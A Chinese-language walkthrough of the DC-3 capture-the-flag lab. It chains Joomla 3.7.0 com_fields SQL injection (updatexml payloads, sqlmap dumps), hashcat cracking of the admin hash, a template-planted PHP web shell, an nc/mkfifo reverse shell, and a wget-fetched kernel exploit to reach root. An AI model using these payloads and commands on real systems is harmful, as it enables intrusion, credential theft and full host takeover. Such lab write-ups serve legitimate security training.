DC3渗透测试

一：信息收集

1.对目标进行扫描

这里的环境是直接假设我们已经进入内网环境，所以目标和主机都处于同一个网段，我们直接根据直接的网段进行扫描即可

利用namp进行扫描，查找目标主机，扫出来的端口只有一个http，也证明了存在web服务，还提供了系统的相关信息

namp -sV -sC -A -T4 ip

这里有一个ip为192.168.20.132的功能很多，是一个名为joomla的cms，利用火狐搜索一下，很明显就是我们的目标

这里有个登录框 我用万能钥匙和弱口令爆破了一下 都不行 可能对输入框做了加密操作

用dirsearch扫描一下网站看看

这里看到一个htaccess.txt可以访问，应该与配置文件有关，后续访问了一下发现是一些配置信息，防止了大部分注入和xss攻击

再继续看，发现了一个管理员页面，/administrator/index.php,访问发现是一个管理员的登录框，这里也可以尝试一下爆破，用户大概率就是admin

2.指纹收集

使用whatweb进行收集，看有没有更多的资产，和前面收集到的信息差不多

whatweb -v 192.168.20.132

二.渗透过程

信息收集到现在都还没有发现这个cms的版本，经过了解发现kali上还有一个专门针对joomla的扫描器

扫描一下收集到了版本信息,版本信息是joomla 3.7.0

joomscan –url http://域名

可以去搜索一下看看这个版本有什么现成的exp

查询了一下返回清一色的sql注入 了解一下则会个漏洞的注入原理，原来是这个漏洞出现在3.7.0新引入的一个组件“com_fields”，这个组件任何人都可以访问，无需登陆验证。由于对请求数据过滤不严导致sql 注入，sql注入对导致数据库中的敏感信息泄漏，例如用户的密码hash以及登陆后的用户的session（如果是获取到登陆后管理员的session，那么整个网站的后台系统可能被控制），主要针对的参数是list[fullordering]

利用msf，看有没有现成的poc去验证一下

这里根据返回的路劲去查看一下payload，Kali的exploits路径为/usr/share/exploitdb/exploits下

这里扫描到了参数list[fullordering]有三种可以利用的注入类型，为了提高效率优先选择报错类型，用poc去目标网站验证一下

http://192.168.20.132/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27

这个参数会被order by拼接到sql查询语句里面，我们可以猜想后端的sql语句为：

ELECT * FROM table WHERE ordering = ‘{$list[‘fullordering’]}’

当我们传入的参数包含了单引号就会使语句无法闭合而报错，ELECT * FROM table WHERE ordering = ‘updatexml’’

这个payload是一个简单的错误返回，通过%27（即单引号）导致sql语句语法错误，来验证

这个可以帮助我们快速验证漏洞，然后用sqlmap去打，这里因为我试了一下发现这个参数的包裹方式很简单我就直接在目标注入了

?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(1,user()),1)

根据逻辑关系慢慢注入依次得到以下信息：

数据库：joomladb

后面表名太多了，用报错很麻烦，还是用sqlmap

扫描库名

sqlmap -u “http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml“ –risk=3 –level=5 –random-agent –dbs -p list[fullordering]

扫描表名

sqlmap -u “http://192.168.20.132/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml“ –risk=3 –level=5 –random-agent -D joomladb –tables -p list[fullordering]

有一个名为users的表，这个表就是我们的目标

注入得到字段信息

sqlmap -u “http://192.168.20.132/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml“ –risk=3 –level=5 –random-agent -D joomladb -T “#__users” –columns -p list[fullordering]

爆破字段内容

sqlmap -u “http://192.168.20.132/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml“ –risk=3 –level=5 –random-agent -p list[fullordering] -D “joomladb” -T “#__users” -C “username,password” –dump

这个密码应该是被某种方式加密了，admin 对应的密码是 bcrypt 哈希值，可以使用kali自带的工具hashcat来破解，先创建一个存放hash的txt

echo ‘$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu’ > joomla_hash.txt

利用kali自带的字典进行破解，如果以前没有用过这个字典的话需要自己解压才行

hashcat -m 3200 -a 0 joomla_hash.txt /usr/share/wordlists/rockyou.txt

3200这里是匹配bcrypt哈希

得到密码进行登录

成功以admin登录，但是还没有拿到想要的webshell，先到处查看一下功能，看看有没有可能的漏洞

尝试获取webshell

在模板功能里面找到了一个可以上传文件的地方，先试试简单的一句话木马，看看能不能成功

echo ““ >shell.txt 上传发现提示找不到文件，仔细看了看是在本地保存一个文件

这里可以本地直接创建一个php文件，保存后它也提示了我们文件的位置，templates/beez3/shell.php

用蚁剑连接成功

一句话木马 ：

进入虚拟终端

这里看到只是一个普通用户，并且shell是sh，我们需要升级shell并进行提权

提权

这里由于目标并没有出网，是一个内网系统，我们就用kali（kali刚好和目标在一个网段）来进行反向shell连接好了，服务器应该行不通

nc -lvp 4444

在kali上用4444端口建立监听

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip 4444 >/tmp/f

这里虽然建立了连接，但是提示了没有tty，后续很多命令操作都会不方便，我们可以利用python自己生成一个tty

which python

python -c ‘import pty; pty.spawn(“/bin/bash”)’

执行后看看shell是否成功升级，这里显示shell为bash说明成功了

接下来就是寻找提权的办法，先看看有哪些suid权限的文件，suid权限在执行的时候可以直接充当root权限，对于提权有很大的帮助

find / -perm -u=s -type f 2>/dev/null

方法一：

往下看发现了一个pkexec，pkexec 是 PolicyKit 的核心工具，用于以 root 权限执行命令，历史上存在 CVE-2021-4034（PwnKit） 漏洞 —— 几乎影响所有 Linux 系统（2022 年前的版本），无需特殊权限即可通过 EXP 提权到 root

查看一下版本：pkexec –version 发现版本号是0.105 满足版本号要求，pwnkit的exp是公开的，可以去下载也可以手动创建，这里我手动创建了一个名为pwnkit.c的exp文件

然后用gcc编译一个可执行文件，编译成功会显示文件

pwnkit就是成功编译后的文件，但是我编译成功后执行并没有触发漏洞模块，后面还是没有成功触发

方法二：

手动利用漏洞不行尝试一下工具msf，利用现成的脚本

先查看一下系统的内核版本

知道了系统版本号上网搜索了一下，说存在一个严重的本地提权漏洞

我们用msf查找一下exp

寻找对应的版本号的漏洞，这里有一个名为39772.txt的文件，应该对漏洞进行了说明，查看一下

msf对应的脚本都放在默认的目录下：/usr/share/exploitdb/exploits

根据漏洞的说明直接下载文件39772.zip，建议在反向shell中直接进入tmp目录，这个目录是linux默认的临时文件目录允许所有用户进行写入，删除，修改操作，没有权限限制

wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip -O 39772.zip

下载后用unzip对39772.zip进行解压，再对exploit.tar进行解压，然后就可以编译脚本文件（这里要注意每次解压完都会自动产生一个目录，根据提示进入相应的目录）

./cpmpile.sh #编译脚本文件

./doubleput #执行可执行文件

成功利用exp提权到root用户，进入root目录，接下来就可以看到flag了
